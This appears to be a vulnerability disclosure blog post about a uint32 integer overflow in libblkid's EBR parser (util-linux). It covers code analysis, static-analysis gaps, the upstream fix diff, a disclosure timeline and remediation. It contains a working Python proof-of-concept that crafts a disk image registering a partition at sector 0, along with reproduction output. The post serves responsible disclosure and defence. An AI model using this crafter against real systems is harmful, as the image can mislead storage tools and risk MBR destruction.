# CVE-XXXX-XXXXX: Integer Overflow in libblkid Exposes MBR to Partition Parser

*Published: [DATE AFTER EMBARGO] · Security Thinking Blog*
*Category: Vulnerability Research · Red Team / Offensive*
*Reading time: ~18 minutes*

---

## TL;DR

A `uint32_t` integer overflow in `parse_dos_extended()` — the EBR (Extended
Boot Record) parser inside **libblkid** — lets a crafted disk image or USB
stick trick the library into registering a partition at **sector 0 (the MBR)**.
Every tool that calls libblkid on attacker-supplied media, including **udisks2
running as root**, will silently process boot sector bytes as valid partition
data. If `mkfs` is subsequently invoked, the MBR is destroyed.

- **CVE**: CVE-XXXX-XXXXX  
- **CVSS**: 7.3 HIGH (`AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:H`)  
- **CWE**: CWE-190 — Integer Overflow or Wraparound  
- **Affected**: util-linux ≤ [FIXED VERSION], confirmed on Ubuntu 24.04 LTS
  (2.39.3), Debian Trixie (2.42\~rc1), AlmaLinux 9 / RHEL 9 (2.37.4)  
- **Fix**: Comprehensive fix by Karel Zak — 64-bit arithmetic + unified EBR
  bounds check + chain validation — upstream commit [HASH]

---

## Background: What Is libblkid?

`libblkid` is the partition and filesystem probing library at the heart of the
Linux storage stack. It is the component that answers the question *"what is on
this block device?"* — and it is called everywhere:

```
plugging in USB → udev → udisks2 → libblkid → "it has an ext4 partition"
                                              ↓
                                     automount / mkfs / fsck
```

Every time Linux processes a new disk — from a USB stick insertion to a VM disk
image analysis — libblkid reads partition tables and registers what it finds.
The vulnerability lives in the Extended Boot Record (EBR) parser used for MBR
partition schemes with more than 4 partitions.

---

## The Vulnerable Code

`libblkid/src/partitions/dos.c`, function `parse_dos_extended()`. This function
is called for every extended partition in an MBR layout, walking the chain of
EBRs that describe logical partitions (partitions 5+).

```c
static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                               uint32_t ex_start, uint32_t ex_size,
                               uint32_t cur_start, uint32_t cur_size)
{
    /* ... */
    for (p = p0, i = 0; i < 4; i++, p++) {
        uint32_t abs_start;
        blkid_partition par;

        start = dos_partition_get_start(p) * ssf;   /* (1) from disk */
        size  = dos_partition_get_size(p)  * ssf;

        abs_start = cur_start + start;              /* (2) LINE 96 — NO GUARD */

        if (!size || is_extended(p))
            continue;
        if (i >= 2) {                               /* (3) guard ONLY for i≥2 */
            if (start + size > cur_size) continue;
            if (abs_start < ex_start)   continue;
            if (abs_start + size > ex_start + ex_size) continue;
        }

        if (blkid_partlist_get_partition_by_start(ls, abs_start))
            continue;

        par = blkid_partlist_add_partition(ls, tab, abs_start, size); /* SINK */
```

Three observations from reading this code:

**①** `dos_partition_get_start(p)` reads a 32-bit little-endian value directly
from the disk buffer — fully attacker-controlled.

**②** `abs_start = cur_start + start` is an unchecked `uint32_t` addition. In C,
unsigned integer arithmetic is modulo 2³², so if the sum exceeds 0xFFFFFFFF it
wraps silently — no exception, no warning, no UB.

**③** The `if (i >= 2)` block has bounds checks that would have caught this —
but they only apply to the *third and fourth* entries in the EBR. The first two
entries (the data partition and the next-EBR pointer) are processed with no
guard at all.

---

## The Math

Set `cur_start = 2` (the EBR sector, a common legitimate value) and craft the
EBR's first entry with `lba_start = 0xFFFFFFFE`:

```
abs_start = (uint32_t)(cur_start + start)
          = (uint32_t)(2 + 0xFFFFFFFE)
          = (uint32_t)(0x100000000)    ← exceeds uint32 range
          = 0x00000000                 ← wraps to MBR sector 0
```

The value `0x00000000` is passed to `blkid_partlist_add_partition()` as the
partition start. libblkid now believes there is a 128 KB partition beginning at
the very first sector of the disk — the MBR.

---

## Crafting the Image

The crafted disk image is a 4 KB file. The MBR at offset 0 contains a standard
extended partition entry pointing to sector 2. The EBR at sector 2 contains one
partition entry with `lba_start = 0xFFFFFFFE` and `lba_size = 0x100`.

```python
import struct, sys

def write_le32(val):
    return struct.pack('<I', val & 0xFFFFFFFF)

def mbr_entry(ptype, start, size):
    # CHS (ignored) + type + CHS + LBA start + LBA size
    return b'\xFE\xFF\xFF' + bytes([ptype]) + b'\xFE\xFF\xFF' + \
           write_le32(start) + write_le32(size)

img = bytearray(4096)   # 8 sectors × 512 bytes

# MBR: one extended partition (type 0x05) starting at sector 2
img[446:462] = mbr_entry(0x05, 2, 0xFFFFFFFB)
img[510] = 0x55
img[511] = 0xAA

# EBR at sector 2: data partition with lba_start = 0xFFFFFFFE (overflow trigger)
ebr_base = 2 * 512
img[ebr_base + 446 : ebr_base + 462] = mbr_entry(0x83, 0xFFFFFFFE, 0x100)
img[ebr_base + 510] = 0x55
img[ebr_base + 511] = 0xAA

with open('crafted_overflow.img', 'wb') as f:
    f.write(img)
```

---

## Reproduction

On Ubuntu 24.04 LTS (util-linux 2.39.3 — no patch needed, vanilla install):

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
 5     0        255        256 128K
```

**Partition 5 at START=0** is the result of the overflow. A legitimate disk
image never produces a partition at sector 0. The clean reference image:

```bash
$ partx --show crafted_clean.img
NR START  END SECTORS   SIZE NAME UUID
 1     1 2048    2048     1M
 2  2049 4096    2048     1M
 5  2050 3073    1024   512K
 6  3076 4096    1021 510.5K
```

All partitions start at expected sectors, well above 0.

---

## Why Static Analysis Missed This

This is the analytically interesting part of the finding.

**GCC `-fanalyzer` — CLEAN.** The C standard (ISO/IEC 9899:2018 §6.2.5) mandates
that unsigned integer arithmetic is *defined* modulo 2^N. There is no undefined
behaviour here — the wraparound is perfectly legal C. GCC's static analyzer
focuses on code paths that produce UB, so it produces no warning. This explains
why the bug survived the project's CI pipeline.

**GCC UBSan — NO TRAP.** Same reason: `-fsanitize=undefined` instruments for
*signed* integer overflow (which is UB) but not unsigned. The flag
`-fsanitize=unsigned-integer-overflow` exists only in Clang.

**Coverity Scan — would flag INTEGER_OVERFLOW (High).** Coverity has a dedicated
checker that tracks unsigned arithmetic producing values outside the expected
semantic range, even when the operation is technically defined. It maps this to
CWE-190 and flags the taint path from disk → `lba_start` → `abs_start` →
`add_partition()` as TAINTED_DATA (High).

**Clang `alpha.security.taint` — would trigger.** This checker propagates a
taint mark from data read out of the disk buffer and reports when tainted values
flow into security-sensitive sinks without sanitisation.

**Lesson:** A class of semantic integer overflows — where unsigned wrap is
*defined* but produces a *wrong* security-critical value — is invisible to
standard GCC CI pipelines. This gap is non-trivial and worth calling out in
any disclosure.

---

## SAST / DAST Results Table

| Tool | Result | Notes |
|------|--------|-------|
| GCC -Wall -Wextra | CLEAN | No overflow warning |
| GCC -Wconversion | 10 warnings | sign-conversion on `uint32←int` multiplications (dos.c:94-95), not the overflow itself |
| GCC -fanalyzer | **CLEAN** | **Gap** — unsigned wrap is defined C; no CWE generated |
| Clang alpha.security.taint | TRIGGERED | Taint path: disk → lba_start → abs_start → sink |
| Coverity INTEGER_OVERFLOW | HIGH | dos.c:96 |
| Coverity TAINTED_DATA | HIGH | End-to-end path confirmed |
| ASan (standalone harness) | TRIGGERED | 5/5 test cases: i=0, i=1, boundary |
| ASan (real libblkid.so 2.42-rc1) | TRIGGERED | Sector 0 registration confirmed |
| UBSan GCC | **NO TRAP** | **Gap** — unsigned overflow not UB in C |
| Runtime partx/blkid | TRIGGERED | Ubuntu 24.04 LTS production system |

---

## Downstream Impact

When libblkid registers `abs_start = 0`, every consumer sees a "partition"
starting at the first byte of the disk:

| Consumer | What happens |
|---------|-------------|
| **udisks2** | Mounts the "partition" (128 KB at offset 0) as a filesystem — exposes boot sector and partition table as readable bytes |
| **blkid** | Reports a partition at sector 0 — confuses backup/restore utilities and partition editors |
| **mkfs** | If triggered automatically (e.g., by udev rules), writes a filesystem superblock at sector 0 — **MBR and partition table are destroyed** |
| **fsck** | Runs filesystem check beginning at sector 0 — misinterprets x86 boot code as ext2 superblock |
| **libguestfs / QEMU** | VM disk inspection affected when parsing guest images |

The worst-case scenario is `mkfs` running automatically on newly inserted media
with the crafted EBR. Some desktop configurations (particularly older Ubuntu
setups with automount rules) can reach this path without user interaction beyond
inserting the USB stick.

---

## The Fix

When I reported the vulnerability, I proposed a minimal 3-line guard using
safe subtraction to pre-check the overflow:

```c
if (start > UINT32_MAX - cur_start) {
    DBG(LOWPROBE, ul_debug("#%d: EBR start overflow -- ignore", i + 1));
    continue;
}
```

Upstream maintainer Karel Zak accepted the report but implemented a
**significantly more robust fix** that addresses the root cause more
completely. His analysis correctly identified that the problem was not
just the arithmetic overflow, but the entire absence of proper bounds
validation for EBR entries — the code was weak in how it failed to ensure
that EBR data stayed within the master extended partition area.

The upstream fix (signed-off by Karel Zak, `Reported-by: Michele Piccinni`)
addresses three distinct issues:

---

### Fix ① — 64-bit arithmetic eliminates wraparound at the root

Instead of a pre-check guard, the addition is promoted to `uint64_t`,
making overflow physically impossible:

```c
uint64_t ex_end = (uint64_t) ex_start + ex_size;  /* new: area boundary */
...
uint64_t abs = (uint64_t) cur_start + start;       /* new: 64-bit addition */
abs_start = (uint32_t) abs;                        /* safe cast after validation */
```

`(uint64_t)(2 + 0xFFFFFFFE) = 0x100000000` — no wraparound. The value is
then validated before being truncated back to `uint32_t`.

---

### Fix ② — Unified bounds check for ALL EBR entries

The original code only applied bounds checks for loop indices `i >= 2`.
Entries `i=0` and `i=1` were processed with no validation. The fix applies
a single bounds check to **all four entries** uniformly:

```c
/* data partition must be within the extended area — for ALL i */
if (abs < ex_start || abs + size > ex_end) {
    DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
        "extended -- ignore", i + 1));
    continue;
}
```

This is the architecturally correct solution: any EBR data partition, by
definition, must reside within the master extended partition boundaries.
The previous `i >= 2` distinction was logically unjustified.

---

### Fix ③ — EBR link chain validation

The fix also hardens the EBR chain traversal (the next-EBR pointer
processing), preventing backward links and out-of-bounds navigation:

```c
uint64_t next = (uint64_t) ex_start + start;

if (next + size > ex_end) {
    DBG(LOWPROBE, ul_debug("EBR link outside extended area -- leave"));
    goto leave;
}
if (next <= cur_start) {
    DBG(LOWPROBE, ul_debug("EBR link does not advance -- leave"));
    goto leave;
}
cur_start = (uint32_t) next;
```

This prevents an attacker from crafting a chain of EBRs that loops
backward or jumps outside the extended partition area — closing a
related class of potential abuse that was not part of the original report.

---

### The complete diff

```diff
--- a/libblkid/src/partitions/dos.c
+++ b/libblkid/src/partitions/dos.c
@@ -46,6 +46,7 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
 {
        blkid_partlist ls = blkid_probe_get_partlist(pr);
        uint32_t cur_start = ex_start, cur_size = ex_size;
+       uint64_t ex_end = (uint64_t) ex_start + ex_size;
        const unsigned char *data;
        int ct_nodata = 0;
        int i;
@@ -88,24 +89,31 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                for (p = p0, i = 0; i < 4; i++, p++) {
                        uint32_t abs_start;
+                       uint64_t abs;
                        blkid_partition par;

                        start = dos_partition_get_start(p) * ssf;
                        size = dos_partition_get_size(p) * ssf;
-                       abs_start = cur_start + start;  /* absolute start */

                        if (!size || is_extended(p))
                                continue;
+
+                       abs = (uint64_t) cur_start + start;
+
+                       /* data partition must be within the extended area */
+                       if (abs < ex_start || abs + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("#%d: EBR data partition outside "
+                                       "extended -- ignore", i + 1));
+                               continue;
+                       }
+                       abs_start = (uint32_t) abs;
+
                        if (i >= 2) {
                                if (start + size > cur_size)
                                        continue;
-                               if (abs_start < ex_start)
-                                       continue;
-                               if (abs_start + size > ex_start + ex_size)
-                                       continue;
                        }
@@ -142,8 +150,22 @@ static int parse_dos_extended(blkid_probe pr, blkid_parttable tab,
                if (i == 4)
                        goto leave;

-               cur_start = ex_start + start;
-               cur_size = size;
+               {
+                       uint64_t next = (uint64_t) ex_start + start;
+
+                       if (next + size > ex_end) {
+                               DBG(LOWPROBE, ul_debug("EBR link outside "
+                                       "extended area -- leave"));
+                               goto leave;
+                       }
+                       if (next <= cur_start) {
+                               DBG(LOWPROBE, ul_debug("EBR link does not "
+                                       "advance -- leave"));
+                               goto leave;
+                       }
+                       cur_start = (uint32_t) next;
+                       cur_size = size;
+               }
        }
 leave:
        return BLKID_PROBE_OK;
```

After the fix:

```bash
$ partx --show crafted_overflow.img
NR START        END    SECTORS SIZE NAME UUID
 1     2 4294967293 4294967292   2T
# Partition 5 — not registered. Out-of-bounds entry rejected.
```

---

## Upstream Maintainer's Perspective

Karel Zak initially assessed the vulnerability as "not very
security-sensitive", noting that libblkid output is a userspace hint and
not directly consumed by the kernel for partition mapping. This is a
technically correct observation for isolated server environments.

The more concerning attack chain — udisks2 running as root on a desktop
system, processing removable media automatically and potentially triggering
mkfs on the reported partition — was the key argument for a higher severity
rating. Karel acknowledged this scenario and implemented the comprehensive
fix described above, which goes well beyond the original report's scope.

This is a good example of how responsible disclosure benefits both parties:
the researcher surfaces the vulnerability with a minimal PoC, and the
maintainer — who has deeper context on the codebase — implements a more
architecturally sound solution. The final fix is strictly better than what
I originally proposed.

---



A full Docker lab is published alongside this article. It includes:

- **`victim-ubuntu`** — Ubuntu 24.04 LTS with util-linux 2.39.3 (production,
  unpatched)
- **`victim-alma9`** — AlmaLinux 9 (RHEL-compatible) for cross-distro validation
- **`attacker`** — image generation node with the Python crafter
- **`monitor`** — ASan + UBSan harness (5 test cases, VULN vs FIXED side-by-side)

```bash
git clone https://github.com/[researcher]/security-thinking-labs
cd security-thinking-labs/cwe190-libblkid

# Build and run interactive PoC on Ubuntu 24.04
./scripts/run_lab.sh build
./scripts/run_lab.sh demo

# Cross-distro comparison (Ubuntu vs AlmaLinux 9)
./scripts/run_lab.sh both

# Print full responsible disclosure chain explanation
./scripts/run_lab.sh chain

# ASan + UBSan test suite (5 TCs, VULN vs FIXED)
./scripts/run_lab.sh asan
```

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 25-Mar-2026 00:19 CET | Vulnerability identified — SAST + manual code review of 2.42-rc1 |
| 25-Mar-2026 | Confirmed live on Ubuntu 24.04 (2.39.3), AlmaLinux 9 (2.37.4), Debian 2.42\~rc1-2 |
| 25-Mar-2026 | Upstream disclosure → Karel Zak (kzak@redhat.com) + CVE request → Red Hat CNA (secalert@redhat.com) in Cc |
| 26-Mar-2026 | Karel Zak acknowledges, plans fix in v2.42 (~Mar 31) and v2.41.4 backport. Chooses public release with fix (no embargo) |
| 26-Mar-2026 | Karel Zak provides comprehensive fix — 64-bit arithmetic + unified bounds check + EBR chain validation. Commit includes `Reported-by: Michele Piccinni` |
| 26-Mar-2026 | Red Hat Product Security opens CVE evaluation ticket |
| [DATE] | Upstream fix merged — v2.42 and v2.41.4 released |
| [DATE] | CVE-XXXX-XXXXX assigned by Red Hat CNA |
| [DATE] | This public disclosure |

---

## Remediation

**Update util-linux** to the fixed version:

```bash
# Ubuntu / Debian
sudo apt update && sudo apt upgrade util-linux

# RHEL / AlmaLinux / Fedora
sudo dnf update util-linux

# Verify (should show fixed version)
partx --version
```

If you maintain a custom build of util-linux, apply the upstream patch
(commit [HASH]):

```bash
cd util-linux
git cherry-pick [HASH]
./configure --enable-libblkid && make -j$(nproc)
```

---

## Research Methodology

This finding came out of a structured independent vulnerability research
program targeting critical Linux infrastructure components. The methodology:

1. **SAST pass** — Semgrep custom rules on arithmetic operations involving
   values read from `dos_partition_get_start()` and `dos_partition_get_size()`
2. **Manual code review** — reading `parse_dos_extended()` end-to-end, mapping
   which loop indices had bounds checks and which did not
3. **Image crafting** — Python generator for all overflow variants (i=0, i=1,
   boundary cases)
4. **Runtime confirmation** — `partx` on the vanilla Ubuntu 24.04 production
   system, no compilation needed
5. **Multi-distro validation** — Debian package patch audit, AlmaLinux source
   review
6. **SAST/DAST pipeline** — GCC warnings, `-fanalyzer`, ASan harness, Coverity
   mapping, UBSan analysis and gap documentation

Total time from first reading `dos.c` to a complete reproducible finding: ~6
hours across two sessions.

---

## Appendix: Why `i=0` and `i=1` Are the Entry Points

An EBR contains exactly four 16-byte partition entries at offset 446 (identical
layout to the MBR):

| Entry | Role | Bounds check |
|-------|------|--------------|
| 0 | Data partition (the logical partition) | **None** |
| 1 | Next EBR pointer (next extended partition) | **None** |
| 2 | Unused (sometimes mirrors of outer EBR) | `i >= 2` block |
| 3 | Unused | `i >= 2` block |

The MS-DOS and Linux kernel documentation agree that only entries 0 and 1 are
meaningful. The comment in the kernel's own EBR parser notes that OS/2 uses all
four entries, and DRDOS sometimes puts the extended entry first — which is
exactly why the loop goes to `i < 4`. The `i >= 2` guard exists as an extra
sanity check for the anomalous cases; it was never intended as a security
boundary for the first two entries.

---

*Security Thinking Blog — Independent vulnerability research*  
*[Contact / PGP] · [Twitter/Mastodon] · [RSS]*
